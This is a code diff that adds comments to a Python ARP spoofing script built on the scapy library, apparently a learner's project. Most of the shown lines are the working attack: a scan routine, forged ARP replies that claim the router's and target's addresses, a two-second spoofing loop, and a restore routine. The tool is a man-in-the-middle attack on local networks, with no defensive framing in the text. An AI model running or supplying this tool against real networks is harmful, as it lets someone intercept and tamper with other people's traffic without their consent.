@@ -4,6 +4,7 @@ import subprocess
 import optparse
 
 
+# get arguments of target and router
 def get_arguments():
     parser = optparse.OptionParser()
     parser.add_option("-t", "--target", dest="target",
@@ -14,6 +15,7 @@ def get_arguments():
     return options.target, options.router
 
 
+# use scan to comunicate with ip and get mac address
 def scan(ip):
     # ARP REQUEST -> who has net ip?
     arp_request = scapy.ARP(pdst=ip)
@@ -32,6 +34,7 @@ def scan(ip):
         return clients_list
 
 
+# function spoof to comunicate ips change targets
 def spoof(target_ip, spoof_ip):
     target_list = scan(target_ip)[0]
     packet = scapy.ARP(op=2, pdst=target_list['ip'], hwdst=target_list['mac'],
@@ -41,11 +44,13 @@ def spoof(target_ip, spoof_ip):
     print(packet.summary())
 
 
+# function to changes ip targets and routers
 def spoof_func(target_ip, spoof_ip):
     spoof(target_ip, spoof_ip)  # tell target "im router"
     spoof(spoof_ip, target_ip)  # tell router "im target"
 
 
+# function restore the ips
 def restore(destination_ip, source_ip):
     destination_list = scan(destination_ip)[0]
     source_list = scan(source_ip)[0]
@@ -58,11 +63,14 @@ def restore(destination_ip, source_ip):
     print(packet.summary())
 
 
+# get arguments
 target, router = get_arguments()
 try:
     while True:
+        # call clear
         subprocess.call('clear')
         try:
+            # use spoof function
             spoof_func(target, router)
             print("[+] Sent to packets")
             time.sleep(2)
